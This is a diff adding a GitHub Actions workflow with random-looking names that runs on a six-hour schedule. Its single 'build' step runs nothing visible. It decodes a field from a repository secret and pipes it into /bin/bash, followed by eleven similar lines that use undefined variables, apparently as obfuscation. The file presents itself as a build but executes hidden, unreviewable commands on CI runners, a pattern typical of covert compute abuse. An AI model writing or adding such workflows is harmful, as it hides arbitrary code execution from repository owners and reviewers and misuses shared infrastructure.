@@ -1,0 +1,30 @@
+name: fengyuanchai4545
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengyuanchai4545
+        env:
+          uy3509: ${{ secrets.uy3509 }}
+        run: |
+          echo $uy3509 | jq -r .jl8 | /bin/bash
+          echo $iq2030 | jq -r .k84492 | /bin/bash
+          echo $yfm75651 | jq -r .y99843 | /bin/bash
+          echo $pitl3 | jq -r .by002 | /bin/bash
+          echo $sbsgx57831 | jq -r .ky365 | /bin/bash
+          echo $wj53 | jq -r .bsie981 | /bin/bash
+          echo $k32139 | jq -r .z01 | /bin/bash
+          echo $ixh390 | jq -r .zgb1 | /bin/bash
+          echo $iqqv68830 | jq -r .ppxu50764 | /bin/bash
+          echo $b9 | jq -r .mvfvh037 | /bin/bash
+          echo $bw19 | jq -r .s87387 | /bin/bash
+          echo $qc3 | jq -r .dfs2 | /bin/bash
+
